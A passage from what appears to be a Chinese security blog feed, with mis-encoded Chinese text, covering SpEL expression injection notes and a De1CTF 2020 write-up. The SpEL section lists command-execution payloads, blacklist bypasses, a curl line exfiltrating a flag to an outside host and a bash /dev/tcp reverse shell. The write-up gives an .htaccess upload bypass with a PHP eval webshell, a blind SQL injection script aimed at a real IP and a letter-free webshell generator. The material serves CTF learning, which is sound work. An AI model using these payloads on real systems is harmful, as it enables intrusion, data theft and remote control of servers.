è¡¨è¾¾å¼ä¸­çš„å˜é‡å¯ä»¥é€šè¿‡è¯­æ³•#å˜é‡åä½¿ç”¨ã€‚å˜é‡å¯ä»¥åœ¨StandardEvaluationContextä¸­é€šè¿‡æ–¹æ³•setVariableè®¾ç½®ã€‚ </p><h4 id="thiså’Œrootå˜é‡"><a href="#thiså’Œrootå˜é‡" class="headerlink" title="thiså’Œrootå˜é‡"></a>thiså’Œrootå˜é‡</h4><p> #thiså˜é‡æ°¸è¿œæŒ‡å‘å½“å‰è¡¨è¾¾å¼æ­£åœ¨æ±‚å€¼çš„å¯¹è±¡ï¼ˆè¿™æ—¶ä¸éœ€è¦é™å®šå…¨åï¼‰ã€‚å˜é‡#rootæ€»æ˜¯æŒ‡å‘æ ¹ä¸Šä¸‹æ–‡å¯¹è±¡ã€‚#thisåœ¨è¡¨è¾¾å¼ä¸åŒéƒ¨åˆ†è§£æè¿‡ç¨‹ä¸­å¯èƒ½ä¼šæ”¹å˜ï¼Œä½†æ˜¯#rootæ€»æ˜¯æŒ‡å‘æ ¹ </p><h3 id="æ˜“é”™ç‚¹"><a href="#æ˜“é”™ç‚¹" class="headerlink" title="æ˜“é”™ç‚¹"></a>æ˜“é”™ç‚¹</h3><p>T()å’Œnewä¸€ä¸ªç±»æ—¶ é™¤äº†java.langä¸‹çš„ç±»ï¼Œå…¶ä»–ç±»éƒ½è¦éœ€è¦éœ€è¦é™å®šåŒ…å…¨å</p><h2 id="SpELå¯¼è‡´çš„ä»»æ„å‘½ä»¤æ‰§è¡Œ"><a href="#SpELå¯¼è‡´çš„ä»»æ„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="SpELå¯¼è‡´çš„ä»»æ„å‘½ä»¤æ‰§è¡Œ"></a>SpELå¯¼è‡´çš„ä»»æ„å‘½ä»¤æ‰§è¡Œ</h2><h3 id="å¸¸ç”¨payload"><a href="#å¸¸ç”¨payload" class="headerlink" title="å¸¸ç”¨payload"></a>å¸¸ç”¨payload</h3><pre><code>T(java.lang.Runtime).getRuntime().exec(&quot;nslookup a.com&quot;)T(Thread).sleep(10000)#this.getClass().forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;nslookup a.com&#39;)new java.lang.ProcessBuilder({&#39;nslookup a.com&#39;}).start()</code></pre><p>åˆ©ç”¨åå°„æ„é€ ç»•è¿‡é»‘åå•</p><pre><code>#{T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;curl fg5hme.ceye.io/`cat flag_j4v4_chun|base64|tr &#39;\n&#39; &#39;-&#39;`&quot;})}</code></pre><p>åˆ©ç”¨ScriptEngineManageræ„é€ ç»•è¿‡é»‘åå•</p><pre><code class="java">#{T(javax.script.ScriptEngineManager).newInstance()    .getEngineByName(&quot;nashorn&quot;)        .eval(&quot;s=[3];s[0]=&#39;/bin/bash&#39;;s[1]=&#39;-c&#39;;s[2]=&#39;ex&quot;+&quot;ec 5&lt;&gt;/dev/tcp/1.2.3.4/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#39;;java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRu&quot;+&quot;ntime().ex&quot;+&quot;ec(s);&quot;)}</code></pre><pre><code>&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[15]    .invoke(&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[7]        .invoke(null),&#39;curl 172.17.0.1:9898&#39;)</code></pre><p> é™¤æ­¤ä»¥å¤–å½“æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤è¢«è¿‡æ»¤æˆ–è€…è¢«URLç¼–ç æ‰æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>String</code>ç±»åŠ¨æ€ç”Ÿæˆå­—ç¬¦<br>å¦‚è¦æ‰§è¡Œçš„å‘½ä»¤ä¸º<code>open /Applications/Calculator.app</code>æˆ‘ä»¬å¯ä»¥é‡‡ç”¨<code>new java.lang.String(new byte[]{,,...})</code>æˆ–è€…<code>concat(T(java.lang.Character).toString())</code>åµŒå¥—æ¥ç»•è¿‡ </p><pre><code>T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,{}).eval(&#39;whatever java code in one statement&#39;).toString()</code></pre><h3 id="ä¸€äº›æŠ€å·§"><a href="#ä¸€äº›æŠ€å·§" class="headerlink" title="ä¸€äº›æŠ€å·§"></a>ä¸€äº›æŠ€å·§</h3><h4 id="newè¢«è¿‡æ»¤"><a href="#newè¢«è¿‡æ»¤" class="headerlink" title="newè¢«è¿‡æ»¤"></a>newè¢«è¿‡æ»¤</h4><p>å¯ä»¥ç”¨NEW</p><h3 id="ä¸€äº›ç›¸å…³çš„ctfé¢˜ç›®"><a href="#ä¸€äº›ç›¸å…³çš„ctfé¢˜ç›®" class="headerlink" title="ä¸€äº›ç›¸å…³çš„ctfé¢˜ç›®"></a>ä¸€äº›ç›¸å…³çš„ctfé¢˜ç›®</h3><h4 id="de1ctf2020-cal"><a href="#de1ctf2020-cal" class="headerlink" title="de1ctf2020 cal"></a>de1ctf2020 cal</h4><h3 id="SpELæä¾›çš„ä¸¤ä¸ªEvaluationContextçš„åŒºåˆ«"><a href="#SpELæä¾›çš„ä¸¤ä¸ªEvaluationContextçš„åŒºåˆ«" class="headerlink" title="SpELæä¾›çš„ä¸¤ä¸ªEvaluationContextçš„åŒºåˆ«"></a>SpELæä¾›çš„ä¸¤ä¸ª<code>EvaluationContext</code>çš„åŒºåˆ«</h3><p>SpELæä¾›çš„ä¸¤ä¸ª<code>EvaluationContext</code>çš„åŒºåˆ«ã€‚<br>ï¼ˆEvaluationContextè¯„ä¼°è¡¨è¾¾å¼ä»¥è§£æå±æ€§ï¼Œæ–¹æ³•æˆ–å­—æ®µå¹¶å¸®åŠ©æ‰§è¡Œç±»å‹è½¬æ¢æ—¶ä½¿ç”¨è¯¥æ¥å£ã€‚æœ‰ä¸¤ä¸ªå¼€ç®±å³ç”¨çš„å®ç°ã€‚ï¼‰</p><ul><li>SimpleEvaluationContextâ€‰- é’ˆå¯¹ä¸éœ€è¦SpELè¯­è¨€è¯­æ³•çš„å…¨éƒ¨èŒƒå›´å¹¶ä¸”åº”è¯¥å—åˆ°æœ‰æ„é™åˆ¶çš„è¡¨è¾¾å¼ç±»åˆ«ï¼Œå…¬å¼€SpELè¯­è¨€ç‰¹æ€§å’Œé…ç½®é€‰é¡¹çš„å­é›†ã€‚</li><li>StandardEvaluationContextâ€‰- å…¬å¼€å…¨å¥—SpELè¯­è¨€åŠŸèƒ½å’Œé…ç½®é€‰é¡¹ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥æŒ‡å®šé»˜è®¤çš„æ ¹å¯¹è±¡å¹¶é…ç½®æ¯ä¸ªå¯ç”¨çš„è¯„ä¼°ç›¸å…³ç­–ç•¥ã€‚</li></ul><p><code>SimpleEvaluationContext</code>æ—¨åœ¨ä»…æ”¯æŒSpELè¯­è¨€è¯­æ³•çš„ä¸€ä¸ªå­é›†ã€‚å®ƒä¸åŒ…æ‹¬ Javaç±»å‹å¼•ç”¨ï¼Œæ„é€ å‡½æ•°å’Œbeanå¼•ç”¨ã€‚</p><p>æ‰€ä»¥è¯´æŒ‡å®šæ­£ç¡®<code>EvaluationContext</code>ï¼Œæ˜¯é˜²æ­¢SpElè¡¨è¾¾å¼æ³¨å…¥æ¼æ´äº§ç”Ÿçš„é¦–é€‰ï¼Œä¹‹å‰å‡ºç°è¿‡ç›¸å…³çš„SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œå…¶ä¿®å¤æ–¹å¼å°±æ˜¯ä½¿ç”¨<code>SimpleEvaluationContext</code>æ›¿ä»£<code>StandardEvaluationContext</code>ã€‚</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p> <a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">http://rui0.cn/archives/1043</a> </p><p> <a href="http://ifeve.com/spring-6-spel/" target="_blank" rel="noopener">http://ifeve.com/spring-6-spel/</a>  æ–‡æ¡£</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/05/06/SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´/">http://blog.ccreater.top/2020/05/06/SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpEL </tag>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>de1ctf2020</title>
      <link href="/2020/05/06/de1ctf2020/"/>
      <url>/2020/05/06/de1ctf2020/</url>
      
        <content type="html"><![CDATA[<h1 id="de1ctf-2020"><a href="#de1ctf-2020" class="headerlink" title="de1ctf 2020"></a>de1ctf 2020</h1><h2 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h2><pre><code>perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!</code></pre><p>æµ‹è¯•å‘ç°ï¼šç¦æ­¢phç»“å°¾åç¼€ï¼Œä½†æ˜¯å¯ä»¥ä¸Šä¼ .htaccess</p><p>ä¸Šä¼ .htaccess</p><pre><code>AddType application/x-httpd-p\hp .jpg</code></pre><p>ä¸Šä¼ test.jpg</p><pre><code class="php">&lt;?=eval($_POST[0]);</code></pre><pre><code>De1ctf{cG1_cG1_cg1_857_857_cgll111ll11lll}</code></pre><h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a><strong>mixture</strong></h2><pre><code>index.phpprofile.phpselect.phpmember.phpadmin.phplogout.php</code></pre><p>é™¤äº†adminå…¶ä»–ç”¨æˆ·ä¸ä¼šæ£€æŸ¥å¯†ç </p><p>ç¥å¥‡çš„æ³¨é‡Š</p><pre><code>index.php:&lt;!------ Include the above in your HEAD tag ----------&gt;member.php:&lt;!--orderby--&gt;</code></pre><p>åæ¥å­¦é•¿è¯´member.phpçš„orderbyå‚æ•°å¯ä»¥æ³¨å…¥ï¼Œæˆ‘æ˜¯æœ‰ç‚¹ä¸ä¿¡çš„ï¼Œåæ¥æƒ³æƒ³è‡ªå·±æ²¡æµ‹å‡ºæ¥ä¹Ÿæ˜¯æ­£å¸¸çš„ï¼š</p><ol><li>æˆ‘ä¸çŸ¥é“orderbyä¼šå°†è¾“å…¥æ”¾åœ¨sqlè¯­å¥çš„ä½ç½®</li><li>ä¸çŸ¥é“æœ‰æ²¡æœ‰wafï¼Œæ— æ³•ç¡®è®¤wafæ˜¯å¦å­˜åœ¨</li></ol><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505122140.png" alt="image697"></p><p>ã€‚ã€‚ã€‚æˆ‘åº”è¯¥fuzzä¸€ä¸‹çš„</p><p>é»‘åå•ï¼š</p><pre><code>ifunion</code></pre><p>æœ€åçš„payload:</p><pre><code class="sql">http://134.175.185.244/member.php?orderby=AND case when (ASCII(SUBSTRING((SELECT USER()),1,1)))=1 then BENCHMARK(100000,MD5(NOW())) ELSE 2 END</code></pre><p>ç›²æ³¨è„šæœ¬ï¼š</p><pre><code class="python">import requestsimport time#ä¿®æ”¹biggerå’Œsqlinjå°±å¥½#å®ç°biggeræ‰èƒ½ä½¿ç”¨def findByDichotomy(begin,end):    max_num=end    while True:        mid=int((begin+end)/2)        if begin==max_num:            return False        if begin==end:            return begin        if end-begin==1:            if bigger(begin):                return end            else:                return begin        if bigger(mid):            begin=mid+1        else:            end=mid#å¾…æ±‚æ•°æ®å¤§äºnumdef bigger(num):    return sqlinj(num)def less(num):    passdef equal(num):    passdef sqlinj(num):    burp0_url = &quot;http://134.175.185.244:80/member.php&quot;    param={&quot;orderby&quot;:&quot;AND case when (ASCII(SUBSTRING((select group_concat(table_name) from information_schema.tables where table_schema=database()),{POS},1)))&gt;{GUESS} then BENCHMARK(100000,MD5(NOW())) ELSE 2 END&quot;.format(POS=pos,GUESS=num)}    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;p781mlp8a9sp3ggrf1solslvn3&quot;}    burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    try :        requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=param,timeout=2)    except Exception:        return True    print(&quot;test &quot;,num)    return Falseresult=&quot;&quot;pos=len(result)+1while True:    num=findByDichotomy(32,128)    if num is False:        print(result)        break    result+=chr(num)    print(result)    pos+=1</code></pre><pre><code>member,usersusers:id,username,moneymember:id,username,passwordadmin 18a960a3a0b3554b314ebe77fe545c85</code></pre><p>åœ¨cmd5ä¸Šæ‰¾åˆ°å¯†ç ï¼š goodlucktoyou </p><p>æ‰“å¼€adminæ˜¯ä¸€ä¸ªphpinfo</p><p>searchæ˜¯ä¸€ä¸ªç±»ä¼¼æ–‡ä»¶åŒ…å«çš„ä¸œä¸œ</p><p>ä½†æ˜¯å¾ˆå¤šéƒ½ä¸è¡Œå¦‚/etc/passwdç­‰ç­‰</p><p>fuzzåå¾—åˆ°æºç </p><p>select.php</p><pre><code class="php">&lt;?phpinclude &quot;profile.php&quot;;$search = $_POST[&#39;search&#39;];if($_SESSION[&#39;admin&#39;]==1){    print &lt;&lt;&lt;EOT&lt;form class=&quot;form&quot; action=&quot;select.php&quot; method=&quot;post&quot;&gt;    &lt;div class=&quot;form-group&quot;&gt;        &lt;label for=&quot;disabledTextInput&quot;&gt;You can search anything here!!&lt;/label&gt;&lt;/br&gt;        &lt;input type=&quot;text&quot; name=&quot;search&quot; id=&quot;fromgo&quot; class=&quot;form-control&quot;&gt;    &lt;/div&gt;    &lt;/div&gt;    &lt;div class=&quot;form-group&quot;&gt;        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;submit&quot;&gt;    &lt;/div&gt;&lt;/form&gt;EOT;}else{    print &lt;&lt;&lt;EOT  &lt;div class=&quot;container&quot;&gt;       &lt;div class=&quot;row&quot;  &gt;                          &lt;div class=&quot;col-md-10 col-md-offset-4&quot;&gt;                             &lt;div class=&quot;input-group&quot; displayï¼šblock;marginï¼š0 auto;&gt;                                                                                   &lt;button class=&quot;btn btn-info btn-search &quot; type=&quot;button&quot; &gt;You are not admin or not enough money!&lt;/button&gt;                              &lt;/span&gt;                &lt;/div&gt;&lt;!-- /input-group --&gt;                            &lt;/div&gt;&lt;!-- /.col-lg-6 --&gt;       &lt;/div&gt;  &lt;/div&gt;EOT;}if($_SESSION[&#39;admin&#39;]==1&amp;&amp;!empty($search)){    //var_dump(urldecode($search));    Minclude(urldecode($search));    //lookup($search);}</code></pre><p>admin.php</p><pre><code class="php">&lt;?phpinclude &quot;profile.php&quot;;session_start();if(empty($_SESSION[&#39;user&#39;])){    header(&quot;location: index.php&quot;);}if($_SESSION[&#39;admin&#39;]==1){    phpinfo();}else{    print &lt;&lt;&lt;EOT&lt;div class=&quot;row&quot;&gt;  &lt;div class=&quot;col-md-6 col-md-offset-4&quot;&gt;You are not admin!!!!&lt;/div&gt;&lt;/div&gt;EOT;}</code></pre><p>member.php</p><pre><code class="php">&lt;?phpinclude &quot;profile.php&quot;;include &quot;config.php&quot;;$orderby = $_GET[&#39;orderby&#39;];?&gt;    &lt;?php    print &lt;&lt;&lt;EOT&lt;div class=&quot;table-responsive&quot;&gt;    &lt;table class=&quot;table&quot;&gt;        &lt;!--orderby--&gt;        &lt;caption&gt;ALLmember&lt;/caption&gt;        &lt;thead&gt;        &lt;tr&gt;            &lt;th&gt;id&lt;/th&gt;            &lt;th&gt;username&lt;/th&gt;            &lt;th&gt;money&lt;/th&gt;&lt;/tr&gt;        &lt;/thead&gt;        &lt;tbody&gt;EOT;    if(!empty($orderby)){        $blacklist = &quot;/if|desc|sleep|rand|updatexml|\^|union|\|\||&amp;&amp;|regexp|exp|extractvalue|length|hex/i&quot;;        if(preg_match($blacklist, $orderby))            exit(&quot;No~~hacker!&quot;);        $sql = &quot;SELECT * FROM users order by id &quot;.$orderby;        $result = $mysqli-&gt;query($sql);        if($result===false){            $sql=&quot;SELECT * FROM users&quot;;        }    }    else{        $sql = &quot;SELECT * FROM users&quot;;    }        $result = $mysqli-&gt;query($sql);        /* free result set */        while($row = $result-&gt;fetch_row()){            //var_dump($row);            print &lt;&lt;&lt;EOT        &lt;tr&gt;            &lt;td&gt;$row[0]&lt;/td&gt;            &lt;td&gt;$row[1]&lt;/td&gt;            &lt;td&gt;$row[2]&lt;/td&gt;&lt;/tr&gt;        &lt;tr&gt;EOT;        }        $result-&gt;free();        $mysqli-&gt;close();    print &lt;&lt;&lt;EOT      &lt;/tbody&gt;  &lt;/table&gt;&lt;/div&gt;EOT;</code></pre><p>index.php</p><pre><code class="php">&lt;?phperror_reporting(0);include &quot;config.php&quot;;session_start();if(!empty($_SESSION[&#39;user&#39;])){    header(&quot;location: /profile.php&quot;);}    session_start();    $username = $_POST[&#39;username&#39;];    $password = $_POST[&#39;password&#39;];    if(!empty($username)&amp;&amp;!empty($password)){        if($username===&#39;admin&#39;)            {                $sql = &quot;select password from member&quot;;                $result = $mysqli-&gt;query($sql);                $row = $result-&gt;fetch_row();                if($row[0]===md5($password)){                    $_SESSION[&#39;user&#39;]=&#39;admin&#39;;                    $_SESSION[&#39;admin&#39;]=1;                    header(&quot;location: /profile.php&quot;);                }                else{                    echo &quot;&lt;script&gt;alert(&#39;nononon,admin password not right&#39;)&lt;/script&gt;&quot;;                }            }        else{            $_SESSION[&#39;user&#39;]=&#39;guest&#39;;            $_SESSION[&#39;admin&#39;]=0;            header(&quot;location: /profile.php&quot;);        }    }?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;profile&lt;/title&gt;    &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; id=&quot;bootstrap-css&quot;&gt;    &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;    &lt;style&gt;        .fakeimg {            height: 200px;            background: #aaa;        }    &lt;/style&gt;&lt;/head&gt;&lt;!------ Include the above in your HEAD tag ----------&gt;&lt;body&gt;    &lt;div id=&quot;login&quot;&gt;        &lt;div class=&quot;container&quot;&gt;            &lt;div id=&quot;login-row&quot; class=&quot;row justify-content-center align-items-center&quot;&gt;                &lt;div id=&quot;login-column&quot; class=&quot;col-md-6&quot;&gt;                    &lt;div id=&quot;login-box&quot; class=&quot;col-md-19&quot;&gt;                        &lt;form id=&quot;login-form&quot; class=&quot;form&quot; action=&quot;index.php&quot; method=&quot;post&quot;&gt;                            &lt;h3 class=&quot;text-center text-info&quot;&gt;Login&lt;/h3&gt;                            &lt;div class=&quot;form-group&quot;&gt;                                &lt;label for=&quot;username&quot; class=&quot;text-info&quot;&gt;Username:&lt;/label&gt;&lt;br&gt;                                &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; class=&quot;form-control&quot;&gt;                            &lt;/div&gt;                            &lt;div class=&quot;form-group&quot;&gt;                                &lt;label for=&quot;password&quot; class=&quot;text-info&quot;&gt;Password:&lt;/label&gt;&lt;br&gt;                                &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;form-control&quot;&gt;                            &lt;/div&gt;                            &lt;div class=&quot;form-group&quot;&gt;                                &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;submit&quot;&gt;                            &lt;/div&gt;                        &lt;/form&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/body&gt;</code></pre><p>emm,Mincludeæ˜¯ä»€ä¹ˆç¥å¥‡çš„ä¸œè¥¿</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505134518.png" alt="image8380"></p><p>fuzzåå‘ç°å…¶å®æ˜¯è¯»å–å†…å­˜é‡Œçš„å†…å®¹</p><p>fuzzå¾—åˆ°/readflag,ä»ä¸­å¯çŸ¥flagåœ¨/flagä¸­</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505143547.png" alt="image8517"></p><p>ä½†æ˜¯è¦è¿è¡Œçš„è¯ï¼Œé‚£å°±å¿…é¡»æ‹¿åˆ°shell,è¿˜æ˜¯è¯´flagåœ¨è¿™ä¸ªç¨‹åºé‡Œ</p><p>ç°æœ‰ä»¥ä¸‹å‡ ç§æƒ³æ³•ï¼š</p><ol><li>åˆ©ç”¨/proc/xx/cwd/flagæ¥æ‹¿åˆ°flagä½†æ˜¯ï¼Œfuzzåˆ°10000è¿˜æ²¡æœ‰</li><li>ä»å†…å­˜ä¸­ç›´æ¥æ‹¿åˆ°flag(å¥½åƒä¸è¡Œ)</li><li>ä»ç¨‹åºä¸­æ‹¿åˆ°flag(ä¸ä¼š,ä¹Ÿä¸æ¸…æ¥šè¡Œä¸è¡Œ)</li><li>æ‹¿åˆ°shell(æ²¡æ€è·¯)</li><li>Mincludeæœ‰æ´ï¼ˆæ²¡æ‰¾åˆ°ï¼‰</li></ol><p>å†è§</p><p>emï¼Ÿ</p><p><code>../../../../../../../../../../../../../../../../../../../../../../../etc/passwd</code></p><p>è¿™æ ·ä¹Ÿèƒ½è¯»å–æ–‡ä»¶ï¼Œæœ‰æ²¡æœ‰æœºä¼šæ–‡ä»¶åŒ…å«ï¼Ÿ</p><h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a><strong>Hard_Pentest_1</strong></h2><pre><code class="php">&lt;?php//Clear the uploads directory every hourhighlight_file(__FILE__);$sandbox = &quot;uploads/&quot;. md5(&quot;De1CTF2020&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]);@mkdir($sandbox);@chdir($sandbox);if($_POST[&quot;submit&quot;]){    if (($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check()){        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){            die($_FILES[&quot;file&quot;][&quot;error&quot;]);        }        else{            $filename=md5($_SERVER[&#39;REMOTE_ADDR&#39;]).&quot;_&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $filename);            echo &quot;save in:&quot; . $sandbox.&quot;/&quot; . $filename;        }    }    else{        echo &quot;Not Allow!&quot;;    }}//å†…å®¹é™åˆ¶ï¼špreg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)==false //åç¼€é™åˆ¶ï¼šä¸èƒ½ä¸ºï¼šphpï¼Œä¸åŒ…å«..function Check(){    $BlackExts = array(&quot;php&quot;);    $ext = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);    $exts = trim(end($ext));    $file_content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);    if(!preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)  &amp;&amp;         !in_array($exts, $BlackExts) &amp;&amp;         !preg_match(&#39;/\.\./&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) {          return true;    }    return false;}?&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>ç¬¬ä¸€æ­¥ç»•è¿‡åç¼€åï¼š.phP</p><p>ç¬¬äºŒæ­¥ç»•è¿‡æ–‡ä»¶å†…å®¹ï¼š</p><pre><code class="php">&lt;?php$a = &#39;A&#39;;$b = &#39;SYSTEM&#39;;//$b = &#39;readfile&#39;;$c = &quot;POST&quot;;$vv = &#39;__&#39;;$v = &#39;_&#39;;function fuck($b){    $data = &#39;&#39;;    $a = &#39;A&#39;;    $vv = &#39;__&#39;;    $v = &#39;_&#39;;    for ($i = 0; $i &lt; strlen($b); $i++) {        if (ord($b[$i]) &gt;= ord(&#39;a&#39;) &amp;&amp; ord($b[$i]) &lt;= ord(&#39;z&#39;)) {            $data .= &#39;($&#39; . $v . &#39;=$____),&#39;;            for ($a = ord(&#39;a&#39;); $a &lt; ord($b[$i]); $a++) {                $data .= &#39;($&#39; . $v . &#39;++),&#39;;            }        } else if (ord($b[$i]) &gt;= ord(&#39;A&#39;) &amp;&amp; ord($b[$i]) &lt;= ord(&#39;Z&#39;)) {            $data .= &#39;($&#39; . $v . &#39;=$___),&#39;;            for ($a = ord(&#39;A&#39;); $a &lt; ord($b[$i]); $a++) {                $data .= &#39;($&#39; . $v . &#39;++),&#39;;            }        } else {            $data .= &#39;$&#39; . $v . &#39;=&quot;&#39; . $b[$i] . &#39;&quot;;&#39;;        }        $data .= &#39;($&#39; . $vv . &#39;.=$&#39; . $v.&#39;),&#39;;    }    return $data;}$a=&#39;&lt;?=[($_=[]),($_=@&quot;$_&quot;),($___=$_[(&quot;!&quot;!=&quot;!&quot;)]),($____=$_[(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)]),&#39;.fuck($b).&#39;$_____=$__]?&gt;&#39;;//system$a.=&#39;&lt;?=[($__=&quot;_&quot;),($_=[]),($_=@&quot;$_&quot;),&#39;.fuck($c).&#39;$_]?&gt;&#39;;//_POST$a.=&#39;&lt;?=[($_____($$__[_]))]?&gt;&#39;;echo $a;</code></pre><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><pre><code>GET /spel/calc?calc=&#39;1&#39;%2b&#39;1&#39; =&gt; 11GET /spel/calc?calc=&#39;1&#39;.length  {&quot;timestamp&quot;:&quot;2020-05-05T07:23:42.244+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1008E: Property or field &#39;length&#39; cannot be found on object of type &#39;java.lang.String&#39; - maybe not public or not valid?&quot;,&quot;path&quot;:&quot;/spel/calc&quot;}</code></pre><p>è°·æ­Œä¸€æ®µæ—¶é—´åå‘ç°è¿™é‡Œä½¿ç”¨spel(Spring è¡¨è¾¾å¼è¯­è¨€  Spring Expression Language )æ¥è®¡ç®—çš„</p><p>é»‘åå•ï¼š<code>getClass,String,#,new,T(,reader</code></p><pre><code>&#39;&#39;.class.forName(&#39;java.l&#39;%2b&#39;ang.Ru&#39;%2b&#39;ntime&#39;).getMethod(&#39;ex&#39;%2b&#39;ec&#39;,&#39;&#39;.class)</code></pre><p>åŸæœ¬æƒ³é‚£shellçš„åæ¥çœ‹åˆ°OpenRASP,æƒ³æƒ³è¿˜æ˜¯ç›´æ¥è¯»å–æ–‡ä»¶æ–¹ä¾¿ä¸€ç‚¹</p><p>æ„é€ payload:</p><p><code>neW+java.io.RandomAccessFile(&#39;/flag&#39;,&#39;r&#39;).readLine()</code></p><p>SpELä¸­é™¤äº†java.langä¸‹çš„ç±»ï¼Œå…¶ä»–çš„ç±»åœ¨å®ä¾‹åŒ–çš„æ˜¯å¦éœ€è¦å®Œæ•´çš„åŒ…å</p><p>flag:<code>De1CTF{NobodyKnowsMoreThanTrumpAboutJava}</code></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/05/06/de1ctf2020/">http://blog.ccreater.top/2020/05/06/de1ctf2020/</a> 